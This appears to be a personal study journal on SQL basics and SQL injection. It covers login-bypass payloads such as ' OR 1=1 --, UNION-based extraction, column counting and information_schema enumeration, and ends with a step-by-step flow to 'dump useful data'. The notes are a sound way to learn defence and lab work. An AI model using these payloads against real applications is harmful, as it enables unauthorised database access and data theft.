@@ -1,0 +1,265 @@
+# Day 2 — SQL Foundations Before Injection
+
+Yesterday’s session was focused on SQL Injection basics, but while going through it, something felt off.
+
+It wasn’t that the concepts were hard — it was that the foundation underneath them wasn’t strong enough.
+
+SQL Injection is not just payloads.
+It’s understanding how SQL itself behaves.
+
+So instead of rushing ahead, today was about slowing things down and fixing that gap.
+
+This is still basic — but it’s the kind of basic that actually matters.
+
+We’re going to stay on SQL for a few days.
+Until things feel natural.
+Until queries don’t look like syntax anymore, but logic.
+
+No rushing to the next topic.
+Grip first, then move.
+
+---
+
+## Core SQL Commands (Refresher)
+
+### Database Operations
+
+```sql
+SHOW DATABASES;
+CREATE DATABASE db_name;
+USE db_name;
+```
+
+### Table Operations
+
+```sql
+SHOW TABLES;
+
+CREATE TABLE users (
+    name VARCHAR(100)
+);
+```
+
+### Data Operations
+
+```sql
+INSERT INTO users VALUES ('alice');
+INSERT INTO users VALUES ('bob');
+
+SELECT * FROM users;
+```
+
+### Delete / Drop
+
+```sql
+DROP DATABASE db_name;
+```
+
+---
+
+## Useful Built-in Functions
+
+```sql
+SELECT USER();
+SELECT VERSION();
+SELECT DATABASE();
+```
+
+- `USER()` → current DB user (e.g., root@localhost)
+- `VERSION()` → DB version
+- `DATABASE()` → current DB (NULL if none selected)
+
+---
+
+## SQL Injection — Core Building Blocks
+
+### Comments (used to terminate queries)
+
+```sql
+-- 
+# 
+/* */
+```
+
+Example:
+
+```sql
+' OR 1=1 --
+```
+
+### Always True Condition
+
+```sql
+OR 1=1
+```
+
+### Login Bypass Pattern
+
+```sql
+' OR username='admin' --
+```
+
+---
+
+## Types of SQL Injection
+
+### 1. In-band (Direct Output)
+- Data is visible in response
+- Types:
+  - Error-based
+  - Union-based
+
+### 2. Inferential (Blind)
+
+No direct data → analyze behavior
+
+#### Boolean-based
+
+- True → normal response  
+- False → different response  
+
+#### Time-based
+
+- Delay confirms condition
+
+---
+
+### 3. Out-of-band (Rare)
+
+- Uses external channels (DNS / HTTP)
+- Not commonly used in basic labs
+
+---
+
+## UNION-Based Injection
+
+### Rule:
+- Same number of columns
+- Compatible data types
+
+### Basic Example
+
+```sql
+SELECT * FROM login UNION SELECT 1,2,3;
+```
+
+### Extract Useful Data
+
+```sql
+SELECT * FROM login UNION SELECT 1,2,VERSION();
+SELECT * FROM login UNION SELECT DATABASE(),USER(),VERSION();
+```
+
+---
+
+## Finding Number of Columns
+
+### Method 1: ORDER BY
+
+```sql
+ORDER BY 1 --
+ORDER BY 2 --
+ORDER BY 3 --
+```
+
+Increase until error occurs → last valid = column count
+
+---
+
+### Method 2: UNION NULL
+
+```sql
+UNION SELECT NULL --
+UNION SELECT NULL, NULL --
+UNION SELECT NULL, NULL, NULL --
+```
+
+---
+
+## Matching Data Types
+
+```sql
+UNION SELECT 'a', NULL, NULL --
+```
+
+- Replace NULLs with strings/numbers to test compatibility
+
+---
+
+## Database Enumeration (information_schema)
+
+### Get Databases
+
+```sql
+SELECT schema_name FROM information_schema.schemata;
+```
+
+### Get Tables
+
+```sql
+SELECT table_name 
+FROM information_schema.tables 
+WHERE table_schema = 'db_name';
+```
+
+### Get Columns
+
+```sql
+SELECT column_name 
+FROM information_schema.columns 
+WHERE table_name = 'users';
+```
+
+---
+
+## Extract Multiple Values in One Go
+
+```sql
+SELECT GROUP_CONCAT(table_name) 
+FROM information_schema.tables 
+WHERE table_schema = 'db_name';
+```
+
+---
+
+## Observations
+
+- UNION is strict → column count must match
+- Comments are critical for cutting queries
+- Blind injection is about behavior, not output
+- `information_schema` is basically a map of the database
+- Once structure is known → extraction becomes straightforward
+
+---
+
+## Approach / Flow
+
+1. Find injection point
+2. Test:
+   ```sql
+   ' OR 1=1 --
+   ```
+3. Identify number of columns
+4. Match data types
+5. Use UNION to extract system info
+6. Enumerate:
+   - databases
+   - tables
+   - columns
+7. Dump useful data
+
+---
+
+## Current State
+
+Still early.
+
+Still basic.
+
+But now things are starting to connect.
+
+Tomorrow:
+More SQL.
+Then labs.
+
+No skipping steps this time.
